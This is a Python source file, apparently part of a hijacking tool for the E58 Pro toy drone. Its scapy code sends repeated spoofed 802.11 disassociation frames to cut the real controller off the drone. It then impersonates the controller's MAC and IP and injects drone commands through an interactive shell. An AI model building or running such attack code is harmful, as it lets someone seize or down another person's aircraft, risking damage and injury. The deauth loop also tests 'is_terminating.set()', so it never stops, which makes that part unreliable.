from time import sleep
from collections import Callable

from scapy.layers.dot11 import RadioTap, Dot11FCS, Dot11QoS, Dot11, Dot11Deauth, Dot11Disas
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Packet
from scapy.sendrecv import sendp, send
from threading import Thread, Event

from e58pro.packet_structures import new_default_command_payload, new_keep_alive_payload, E58ProHeader, E58ProSecondaryHeader, E58ProBasePayload

from e58pro.address_results import AddressResults

from interactive_shell.interactive_shell import InteractiveShell
from e58pro.commands import produce_commands


#INTERFACE = "wlx4401bb9182b7"
DEAUTH_REASON = 0x03
# 1314 microseconds. Arbitrary? I think I stole this value from airodump captures.
SEND_DURATION = 1314
DEAUTH_SUBTYPE = 12

# Can be either DOT11Deauth or Dot11Disas
DOT11_DISCONNECT_TYPE = Dot11Disas


# TODO: Have the user choose either connected or connectionless mode.
#  If connectionless, start a scan, then do the unconnected_routine
#  If connected, initiate connection (have user do that?), then do connected routine.

UDP_SRC_PORT = 49092  # Arbitrary. Will be where video is sent back?
UDP_DST_PORT = 8800


def udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
    return IP(src=controller_ip, dst=drone_ip) / \
           UDP(sport=UDP_SRC_PORT, dport=UDP_DST_PORT)


def dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
    return RadioTap(present="Rate+TXFlags") / \
           Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
           Dot11QoS() / \
           LLC(ssap=0xAA, dsap=0xAA) / \
           SNAP()


def _start_udp_keep_alive(interface_name: str, is_terminating: Event, l4_base: Packet, sender_func: Callable) -> None:
    def keep_alive_loop():
        comm_keep_alive = l4_base / new_default_command_payload()
        video_keep_alive = l4_base / new_keep_alive_payload()

        seq_n = 0
        while not is_terminating.is_set():
            video_keep_alive[E58ProBasePayload].sequence_number = seq_n
            sender_func(comm_keep_alive, iface=interface_name, verbose=False)
            sender_func(video_keep_alive, iface=interface_name, verbose=False)
            seq_n += 1
            sleep(0.05)

    thread = Thread(target=keep_alive_loop)
    thread.start()


def _initialization_routine(interface_name: str, l4_base: Packet, sender_func: Callable) -> Event:
    four_byte_packet = l4_base / E58ProHeader()
    six_byte_packet = four_byte_packet / E58ProSecondaryHeader()

    terminating_event = Event()
    _start_udp_keep_alive(interface_name, terminating_event, l4_base, sender_func)

    #sender_func(four_byte_packet * 5, iface=interface_name, verbose=False)  #  FIXME: Should be disabled for connectionless, enabled for connection?
    #sender_func(six_byte_packet * 5, iface=interface_name, verbose=False)
    return terminating_event


def _interactive_shell_common(interface_name: str, l4_base: Packet, sender_func: Callable):
    keep_alive_termination_event = _initialization_routine(interface_name, l4_base, sender_func)

    command_packet = l4_base / new_default_command_payload()
    try:
        shell = InteractiveShell(produce_commands(interface_name, command_packet))
        shell.loop()
    except KeyboardInterrupt:
        pass
    finally:
        keep_alive_termination_event.set()


def new_sequence_control(frag: int, seq: int) -> int:
    return (seq << 4) + frag


def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Deauth:
    sc = new_sequence_control(0, seq_num)
    # TODO: Why is the RadioTap header with those present flags necessary?
    return RadioTap(present="Rate+TXFlags") / \
           Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
           DOT11_DISCONNECT_TYPE(reason=reason)


def _start_deauther(interface_name: str, is_terminating: Event, deauth: Packet) -> None:
    def deauth_loop():
        seq = 0
        while not is_terminating.set():
            sendp(deauth, iface=interface_name, verbose=False)
            deauth[Dot11].SC = new_sequence_control(0, seq)
            seq += 1
            sleep(0.5)
    thread = Thread(target=deauth_loop)
    thread.start()


def connectionless_interception_routine(interface_name: str, addrs: AddressResults):
    layer_2 = dot11_data_layer(addrs.drone_mac, addrs.controller_mac)
    layers_3_4 = udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)

    deauth = new_deauth(addrs.controller_mac, addrs.drone_mac, addrs.drone_mac, 1, DEAUTH_REASON)
    deauth_terminating = Event()
    try:
        _start_deauther(interface_name, deauth_terminating, deauth)
        _interactive_shell_common(interface_name, layer_2 / layers_3_4, sendp)
    except KeyboardInterrupt:
        pass
    finally:
        deauth_terminating.set()


def connected_interception_routine(interface_name: str, drone_ip: str, controller_ip: str) -> None:
    """To be run after the drone and the controller have been identified.
    Used when you're actually connected to the drone's network."""
    layers_3_4 = udp_layer_3_4(drone_ip, controller_ip)
    _interactive_shell_common(interface_name, layers_3_4, send)

